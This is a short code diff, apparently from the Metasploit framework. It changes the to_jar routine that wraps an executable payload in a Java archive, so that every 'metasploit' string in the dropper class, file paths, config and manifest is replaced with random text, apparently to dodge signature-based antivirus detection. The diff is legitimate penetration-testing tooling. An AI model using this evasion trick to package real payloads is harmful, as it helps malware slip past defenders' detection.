@@ -960,17 +960,26 @@ require 'msf/core/exe/segment_injector'
   def self.to_jar(exe, opts={})
     spawn = opts[:spawn] || 2
     exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
-    zip = Rex::Zip::Jar.new
-    paths = [
-      [ "metasploit", "Payload.class" ],
-    ]
-    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
-    zip.build_manifest :main_class => "metasploit.Payload"
     config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
-    zip.add_file("metasploit.dat", config)
-    zip.add_file(exe_name, exe)
 
-    zip
+    replacement = opts[:metasploit_replace_string] || Rex::Text.rand_text_alpha("metasploit".length)
+
+    paths = [
+      [ "metasploit", "Payload.class" ]
+    ]
+
+    jar = Rex::Zip::Jar.new
+    paths.each do |path|
+      data = File.open(File.join(Msf::Config.data_directory, "java", *path), "rb") {|fd| fd.read(fd.stat.size) }
+      data.gsub!("metasploit", replacement)
+      j_path = path.join("/").gsub("metasploit", replacement)
+      jar.add_file(j_path, data)
+    end
+    jar.add_file("#{replacement}.dat", config)
+    jar.add_file(exe_name, exe)
+    jar.build_manifest(:main_class => "metasploit.Payload".gsub("metasploit", replacement))
+
+    jar
   end
 
   # Creates a Web Archive (WAR) file from the provided jsp code.
